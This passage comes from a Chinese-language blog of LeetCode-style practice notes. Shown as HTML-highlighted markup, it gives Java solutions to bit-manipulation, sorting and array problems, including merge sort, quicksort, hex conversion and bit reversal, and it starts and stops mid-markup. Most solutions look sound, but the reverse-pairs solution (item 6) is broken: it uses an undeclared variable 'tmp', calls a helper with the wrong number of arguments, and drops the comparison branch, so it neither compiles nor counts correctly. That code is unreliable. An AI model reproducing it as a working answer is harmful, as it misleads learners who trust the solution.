       ans[<span class="number">1</span>] ^= num;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-或运算的最小翻转次数"><a href="#10-或运算的最小翻转次数" class="headerlink" title="10. 或运算的最小翻转次数"></a>10. 或运算的最小翻转次数</h3><p>将a和b或运算后的结果与c对比，找出哪些位不同，方法是通过将或运算的结果与c异或，不同位就能找到，结合a和b就知道a和b在这一位上翻转几次</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211001094056.png" alt="image-20211001094053080"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minFlips</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> aOrb = a | b;</span><br><span class="line">        <span class="keyword">int</span> equal = aOrb ^ c;</span><br><span class="line">        <span class="keyword">if</span>(equal == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> mask = <span class="number">1</span> &lt;&lt; i;</span><br><span class="line">             <span class="comment">// a | b 和 c 的第 i 位不同，那么至少需要翻转 1 次</span></span><br><span class="line">            <span class="keyword">if</span>((equal &amp; mask) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>((c &amp; mask) == <span class="number">0</span> &amp;&amp; (a &amp; mask) == (b &amp; mask))&#123;</span><br><span class="line">                    ans += <span class="number">2</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    ans += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="11-数字范围按位与"><a href="#11-数字范围按位与" class="headerlink" title="11. 数字范围按位与"></a>11. 数字范围按位与</h3><p>将前缀保留就好</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rangeBitwiseAnd</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> shift = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">            left &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            right &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            shift++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left &lt;&lt; shift;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211001103437.png" alt="image-20211001103434632"></p><h3 id="12-数字的补数"><a href="#12-数字的补数" class="headerlink" title="12. 数字的补数"></a>12. 数字的补数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findComplement</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> mask = ~<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>((num &amp; mask) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            mask &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ~mask ^ num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="13-数字转换为十六进制"><a href="#13-数字转换为十六进制" class="headerlink" title="13. 数字转换为十六进制"></a>13. 数字转换为十六进制</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toHex</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(num == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"0"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">char</span>[] hexChars = &#123;<span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>&#125;;</span><br><span class="line"></span><br><span class="line">        String res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">while</span>(num != <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> index = num &amp; <span class="number">15</span>;</span><br><span class="line">            res = hexChars[index] + res;</span><br><span class="line">            num &gt;&gt;&gt;= <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="14-颠倒二进制位"><a href="#14-颠倒二进制位" class="headerlink" title="14. 颠倒二进制位"></a>14. 颠倒二进制位</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">// you need treat n as an unsigned value</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverseBits</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)&#123;</span><br><span class="line">            res = (res &lt;&lt; <span class="number">1</span>) | (n &amp; <span class="number">1</span>);</span><br><span class="line">            n &gt;&gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="刷题第七天"><a href="#刷题第七天" class="headerlink" title="刷题第七天"></a>刷题第七天</h2><h3 id="1-归并排序"><a href="#1-归并排序" class="headerlink" title="1. 归并排序"></a>1. 归并排序</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">_912_sort_an_array</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 归并排序</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] sortArray1(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        mergeSort(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>, <span class="keyword">new</span> <span class="keyword">int</span>[nums.length]);</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">mergeSort</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi, <span class="keyword">int</span>[] tmp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (lo &gt;= hi) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">int</span> mid = lo + (hi - lo) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        mergeSort(nums, lo, mid, tmp);</span><br><span class="line">        mergeSort(nums, mid + <span class="number">1</span>, hi, tmp);</span><br><span class="line"></span><br><span class="line">        merge(nums, lo, mid, hi, tmp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> lo, <span class="keyword">int</span> mid, <span class="keyword">int</span> hi, <span class="keyword">int</span>[] tmp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = lo; i &lt;= hi; i++) &#123;</span><br><span class="line">            tmp[i] = nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> i = lo;</span><br><span class="line">        <span class="keyword">int</span> j = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = lo; k &lt;= hi; k++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == mid + <span class="number">1</span>) nums[k] = tmp[j++];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (j == hi + <span class="number">1</span>) nums[k] = tmp[i++];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (tmp[i] &lt;= tmp[j]) nums[k] = tmp[i++];</span><br><span class="line">            <span class="keyword">else</span> nums[k] = tmp[j++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-快速排序"><a href="#2-快速排序" class="headerlink" title="2. 快速排序"></a>2. 快速排序</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 快排</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] sortArray(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">    quickSort(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> nums;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (lo &gt;= hi) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> index = partition(nums, lo, hi);</span><br><span class="line">    quickSort(nums, lo, index - <span class="number">1</span>);</span><br><span class="line">    quickSort(nums, index + <span class="number">1</span>, hi);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 二分切分</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="keyword">new</span> Random().nextInt(hi - lo + <span class="number">1</span>) + lo; <span class="comment">// 随机选一个作为 pivot</span></span><br><span class="line">    swap(nums, i, hi);</span><br><span class="line">    <span class="keyword">int</span> pivot = nums[hi];</span><br><span class="line">    <span class="keyword">int</span> less = lo, great = lo;</span><br><span class="line">    <span class="keyword">for</span> (; great &lt;= hi - <span class="number">1</span> ; great++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[great] &lt; pivot) &#123;</span><br><span class="line">            swap(nums, less, great);</span><br><span class="line">            less++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    swap(nums, less, hi);</span><br><span class="line">    <span class="keyword">return</span> less;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp = nums[i];</span><br><span class="line">    nums[i] = nums[j];</span><br><span class="line">    nums[j] = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 三路快排</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">quickSort1</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (lo &gt;= hi) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> j = <span class="keyword">new</span> Random().nextInt(hi - lo + <span class="number">1</span>) + lo; <span class="comment">// 随机选一个作为 pivot</span></span><br><span class="line">    swap(nums, j, hi);</span><br><span class="line">    <span class="keyword">int</span> pivot = nums[hi];</span><br><span class="line">    <span class="keyword">int</span> less = lo, great = hi;</span><br><span class="line">    <span class="keyword">int</span> i = lo;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= great) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[i] &lt; pivot) &#123;</span><br><span class="line">            swap(nums, i, less);</span><br><span class="line">            less++;</span><br><span class="line">            i++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[i] &gt; pivot) &#123;</span><br><span class="line">            swap(nums, i, great);</span><br><span class="line">            great--;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    quickSort1(nums, lo, less - <span class="number">1</span>);</span><br><span class="line">    quickSort1(nums, great + <span class="number">1</span>, hi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-第二大数字"><a href="#3-第二大数字" class="headerlink" title="3. 第二大数字"></a>3. 第二大数字</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//时间复杂度为O(n) 空间复杂度为O(1)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SecondMaxNumber</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSecondMax</span><span class="params">(<span class="keyword">int</span>[] nums)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> first = Integer.MIN_VALUE;</span><br><span class="line">        <span class="keyword">int</span> second = Integer.MIN_VALUE;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num : nums)&#123;</span><br><span class="line">            <span class="keyword">if</span>(num &gt; first)&#123;</span><br><span class="line">                second = first;</span><br><span class="line">                first = num;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(num &gt; second)&#123;</span><br><span class="line">                second = num;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> second;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-三个数的最大乘积"><a href="#4-三个数的最大乘积" class="headerlink" title="4. 三个数的最大乘积"></a>4. 三个数的最大乘积</h3><p>找到数组中三个最大值和两个最小值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maximumProduct</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 最小的和第二小的</span></span><br><span class="line">        <span class="keyword">int</span> min1 = Integer.MAX_VALUE, min2 = Integer.MAX_VALUE;</span><br><span class="line">        <span class="comment">// 最大的、第二大的和第三大的</span></span><br><span class="line">        <span class="keyword">int</span> max1 = Integer.MIN_VALUE, max2 = Integer.MIN_VALUE, max3 = Integer.MIN_VALUE;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> x : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (x &lt; min1) &#123;</span><br><span class="line">                min2 = min1;</span><br><span class="line">                min1 = x;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x &lt; min2) &#123;</span><br><span class="line">                min2 = x;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (x &gt; max1) &#123;</span><br><span class="line">                max3 = max2;</span><br><span class="line">                max2 = max1;</span><br><span class="line">                max1 = x;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x &gt; max2) &#123;</span><br><span class="line">                max3 = max2;</span><br><span class="line">                max2 = x;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x &gt; max3) &#123;</span><br><span class="line">                max3 = x;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Math.max(min1 * min2 * max1, max1 * max2 * max3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-合并两个有序数组"><a href="#5-合并两个有序数组" class="headerlink" title="5. 合并两个有序数组"></a>5. 合并两个有序数组</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span> m, <span class="keyword">int</span>[] nums2, <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = m -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> j = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> k = m + n -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(j &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i &gt;= <span class="number">0</span> &amp;&amp; nums1[i] &gt; nums2[j])&#123;</span><br><span class="line">                nums1[k] = nums1[i];</span><br><span class="line">                i--;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                nums1[k] = nums2[j];</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            k--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-数组中的逆序对-剑指offer51"><a href="#6-数组中的逆序对-剑指offer51" class="headerlink" title="6. 数组中的逆序对(剑指offer51)"></a>6. 数组中的逆序对(剑指offer51)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReversePairs</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reversePairs</span><span class="params">(<span class="keyword">int</span>[] nums)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums == <span class="keyword">null</span> || nums.length &lt; <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span>[] copy = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">            copy[i] = nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span>[] temp = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        <span class="keyword">return</span> reversePairs(copy, <span class="number">0</span>, nums.length - <span class="number">1</span>, temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">reversePairs</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> left, <span class="keyword">int</span> right, <span class="keyword">int</span>[] temp)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left &gt;= right)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> mid = left + (right - left) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> leftReversePairs = reversePairs(nums,left, mid, temp);</span><br><span class="line">        <span class="keyword">int</span> rightReversePairs = reversePairs(nums,mid + <span class="number">1</span>,right,temp);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> mergeReversePairs = mergeAndCountReversePairs(nums,mid + <span class="number">1</span>,right,temp);</span><br><span class="line">        <span class="keyword">return</span> leftReversePairs + rightReversePairs + mergeReversePairs;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">mergeAndCountReversePairs</span><span class="params">(<span class="keyword">int</span>[] data, <span class="keyword">int</span> left, <span class="keyword">int</span> mid, <span class="keyword">int</span> right, <span class="keyword">int</span>[] temp)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = left; i&lt;= right; i++)&#123;</span><br><span class="line">            tmp[i] = data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> i = left;</span><br><span class="line">        <span class="keyword">int</span> j = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k = left; k &lt;= right; k++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i == mid + <span class="number">1</span>)&#123;<span class="comment">// 左边没有元素，右边有元素</span></span><br><span class="line">                data[k] = temp[j++];</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(j == right+<span class="number">1</span>)&#123;<span class="comment">// 左边有元素，右边没有元素</span></span><br><span class="line">                data[k] = temp[i++];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;<span class="comment">// tmp[i] &gt; tmp[j]</span></span><br><span class="line">                data[k] = data[j++];</span><br><span class="line">                <span class="comment">// 计算 temp[j] 的逆序对</span></span><br><span class="line">                count += mid - i + <span class="number">1</span>;</span><br><span class="line">            &#125;     </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-计算右侧小于当前元素的个数"><a href="#7-计算右侧小于当前元素的个数" class="headerlink" title="7. 计算右侧小于当前元素的个数"></a>7. 计算右侧小于当前元素的个数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 